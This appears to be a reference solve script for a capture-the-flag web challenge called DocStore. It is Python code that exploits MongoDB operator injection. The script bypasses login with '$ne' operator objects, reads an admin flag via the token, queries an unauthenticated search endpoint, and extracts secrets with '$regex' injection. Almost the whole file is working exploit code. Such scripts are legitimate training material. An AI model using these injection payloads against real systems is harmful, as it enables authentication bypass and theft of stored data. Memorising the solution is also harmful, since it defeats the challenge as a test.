#!/usr/bin/env python3
"""
DocStore — Reference solve script
Vulnerability: NoSQL Injection (MongoDB operator injection)

The /api/login endpoint passes the JSON body directly to a MongoDB-style query.
By sending operator objects instead of plain strings, we can bypass authentication.

Two attack vectors are demonstrated:
  A) NoSQL injection in /api/login -> obtain admin token -> /api/profile shows FLAG
  B) Unauthenticated /api/search with {"role": "admin"} -> returns admin doc with FLAG

Usage:
    python solve.py <host> [port]
    python solve.py localhost 8083
"""

import sys
import json
import urllib.request
import urllib.error


def post_json(url, payload):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def get_json(url, token=None):
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = sys.argv[2] if len(sys.argv) > 2 else "8083"
    base = f"http://{host}:{port}"

    print(f"[*] Target: {base}")

    # ---- VECTOR A: NoSQL Injection in /api/login ----
    print("\n=== VECTOR A: NoSQL Injection in /api/login ===")

    # Step 1 — Confirm normal login fails without credentials
    print("\n[1] Normal login attempt (expected to fail)...")
    status, resp = post_json(f"{base}/api/login", {"username": "admin", "password": "wrongpassword"})
    print(f"    Status: {status} — {resp}")

    # Step 2 — Inject MongoDB $ne operator to bypass auth
    # Query becomes: {username: {$ne: ""}, password: {$ne: ""}}
    # This matches the first document in the collection (admin) since its
    # username != "" AND password != ""
    print("\n[2] NoSQL injection: {'username': {'$ne': ''}, 'password': {'$ne': ''}}...")
    status, resp = post_json(
        f"{base}/api/login",
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
    )
    print(f"    Status: {status}")
    print(f"    Response: {json.dumps(resp, indent=2)}")

    token = resp.get("token", "")
    username = resp.get("username", "")
    role = resp.get("role", "")
    print(f"\n    Logged in as: {username} (role={role})")

    if token:
        # Step 3 — Retrieve full profile (includes 'secret' field)
        print("\n[3] Fetching profile with admin token...")
        status, profile = get_json(f"{base}/api/profile", token=token)
        print(f"    Status: {status}")
        print(f"    Profile: {json.dumps(profile, indent=2)}")

        flag = profile.get("secret", "")
        if flag and "CTF{" in flag:
            print(f"\n[FLAG] {flag}")
        else:
            print(f"\n[?] 'secret' field: {flag}")

    # ---- VECTOR B: Unauthenticated /api/search ----
    print("\n=== VECTOR B: Unauthenticated /api/search ===")
    print("\n[4] Searching for admin user via /api/search (no auth required)...")
    status, search_resp = post_json(f"{base}/api/search", {"role": "admin"})
    print(f"    Status: {status}")
    print(f"    Results: {json.dumps(search_resp, indent=2)}")

    results = search_resp.get("results", [])
    for doc in results:
        if doc.get("role") == "admin":
            flag_b = doc.get("secret", "")
            if flag_b:
                print(f"\n[FLAG via search] {flag_b}")

    # ---- VECTOR C: Regex operator to enumerate users ----
    print("\n=== VECTOR C: $regex operator injection ===")
    print("\n[5] Using $regex to find users whose secret starts with 'CTF{'...")
    status, regex_resp = post_json(
        f"{base}/api/search",
        {"secret": {"$regex": "^CTF\\{"}},
    )
    print(f"    Status: {status}")
    print(f"    Results: {json.dumps(regex_resp, indent=2)}")


if __name__ == "__main__":
    main()
